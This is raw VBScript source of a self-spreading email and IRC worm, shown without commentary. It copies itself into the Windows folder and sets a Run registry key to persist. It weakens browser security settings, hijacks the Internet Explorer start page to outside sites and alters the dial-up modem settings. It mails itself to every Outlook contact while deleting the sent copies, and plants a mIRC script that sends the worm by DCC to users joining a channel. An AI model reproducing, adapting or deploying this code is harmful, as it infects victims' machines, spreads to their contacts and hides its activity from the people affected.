   On Error Resume Next
   Set HFFLUO1U = createobject("scripting.filesystemobject")
   HQOL4K4F = HFFLUO1U.getspecialfolder(0)
   P5604884 = HQOL4K4F & "\Win584.vbs"
   Set TO1FSIHV = createobject("wscript.shell")
   if TO1FSIHV.regread ("HKCU\software\moon\explorerxxx2") <> "1" then
   HFFLUO1U.copyfile wscript.scriptfullname, P5604884
   TO1FSIHV.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\explorerx", "wscript.exe " & P5604884 & " %"
   regedat.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004", 00,"REG_DWORD"
   regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Dial","M0"
   regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Off","M1"
   GV8B6431
   Q4512UMQ
   DHQK1AVD ""
   TO1FSIHV.regwrite "HKCU\software\moon\explorerxxx2", 01,"REG_DWORD"
   end if
   Set regedat = CreateObject("WScript.Shell")
   Q4512UMQ2
   Function Q4512UMQ2()
   If (HFFLUO1U.FileExists(HQOL4K4F+"\MegaXXX.exe")) Then
   regcreate "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page","http://www.vipyoung.com/cgi-bin/top/in.cgi?id=jpdvdwar"
   Set regedat = CreateObject("WScript.Shell")
   regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Dial","M0"
   regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Off","M1"
   regedat.RegWrite "HKCU\RemoteAccess\DialUI", 00000007,"REG_BINARY"
   regcreate "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page","http://www.vipyoung.com/cgi-bin/top/in.cgi?id=jpdvdwar"
   Randomize
   If 1 + Int(Rnd * 8) = 3 then
   TO1FSIHV.run HQOL4K4F+"\MegaXXX.exe",false
   end if
   else
   regcreate "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page","http://spazioweb.inwind.it/omanko/gol.htm"
   Set regedat = CreateObject("WScript.Shell")
   regedat.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004", 00,"REG_DWORD"
   regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Dial","M0"
   regedat.RegWrite "HKLM\System\CurrentControlSet\Services\Class\Modem\0000\Settings\SpeakerMode_Off","M1"
   regedat.RegWrite "HKCU\RemoteAccess\DialUI", 00000007,"REG_BINARY"

   end if
   end function

   sub regcreate(regkey,regvalue)
   Set regedit = CreateObject("WScript.Shell")
   regedit.RegWrite regkey,regvalue
   end sub


   Function GV8B6431()
   On Error Resume Next
   Set K13L76VF = CreateObject("Outlook.Application")
   If K13L76VF = "Outlook" Then
   Set HB8EDRD0 = K13L76VF.GetNameSpace("MAPI")
   Set H5HG4H16 = HB8EDRD0.AddressLists
   For Each SBS8397M In H5HG4H16
   If SBS8397M.AddressEntries.Count <> 0 Then
   FI287344 = SBS8397M.AddressEntries.Count
   For IDBN64FV = 1 To FI287344
   Set J6C3B136 = K13L76VF.CreateItem(0)
   Set G26F291V = SBS8397M.AddressEntries(IDBN64FV)
   J6C3B136.To = G26F291V.Address
   J6C3B136.Subject = "‚±‚ñ‚É‚¿‚Í"
   J6C3B136.HtmlBody = "<HTML><HEAD><META content='text/html; charset=iso-2022-jp' http-equiv=Content-Type><META content='MSHTML 5.00.2919.6307' name=GENERATOR></HEAD><BODY>‚±‚ÌŽÊ*^Œ©‚Ä˜A—*‚µ‚Ä‚Ë*I*I*I<IFRAME SRC='http://spazioweb.inwind.it/omanko/gol.htm'></IFRAME> </BODY></HTML>"
   pinocchio = P5604884
   set Attachs=J6C3B136.Attachments
   Attachs.Add pinocchio
   J6C3B136.DeleteAfterSubmit = True
   If J6C3B136.To <> "" Then
   J6C3B136.Send
   End If
   Next
   End If
   Next
   End If
   End function

   Function DHQK1AVD(S65KST2R)
   On Error Resume Next
   If S65KST2R <> "" Then
   PFP108L4 = TO1FSIHV.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If HFFLUO1U.fileexists("c:\mirc\mirc.ini") Then
   S65KST2R = "c:\mirc"
   ElseIf HFFLUO1U.fileexists("c:\mirc32\mirc.ini") Then
   S65KST2R = "c:\mirc32"
   ElseIf HFFLUO1U.fileexists(PFP108L4 & "\mirc\mirc.ini") Then
   S65KST2R = PFP108L4 & "\mirc"
   ElseIf HFFLUO1U.fileexists(PFP108L4 & "\mirc32\mirc.ini") Then
   S65KST2R = PFP108L4 & "\mirc"
   Else
   S65KST2R = ""
   End If
   End If
   If S65KST2R <> "" Then
   Set PDP8HF5D = HFFLUO1U.CreateTextFile(S65KST2R & "\script.ini", True)
   PDP8HF5D = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
   PDP8HF5D = PDP8HF5D & vbCrLf & "n0=on 1:JOIN:#:{"
   PDP8HF5D = PDP8HF5D & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
   PDP8HF5D = PDP8HF5D & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
   PDP8HF5D = PDP8HF5D & P5604884
   PDP8HF5D = PDP8HF5D & vbCrLf & "n3=}"
   script.Close
   End If
   End Function
   Function F7E6IOBR()
   On Error Resume Next
   Set UGME4U0S = HFFLUO1U.Drives
   For Each CPQ92IV5 In UGME4U0S
   KUR8ROO2 = CPQ92IV5 & " \ "
   Call HI0771DM(KUR8ROO2)
   Next
   End Function

   Function HI0771DM(BO64512U)
   On Error Resume Next
   M46SPKI5 = BO64512U
   Set E9DV8B64 = HFFLUO1U.GetFolder(M46SPKI5)
   Set CK94TS3G = E9DV8B64.Files
   For Each JBBHQK1A In CK94TS3G
   If lcase(JBBHQK1A.Name) = "mirc.ini" Then
   DHQK1AVD(JBBHQK1A.ParentFolder)
   End If
   Next
   Set VTN13L76 = E9DV8B64.Subfolders
   For Each VQGB8EDR In VTN13L76
   Call (VQGB8EDR.path)
   Next
   End function
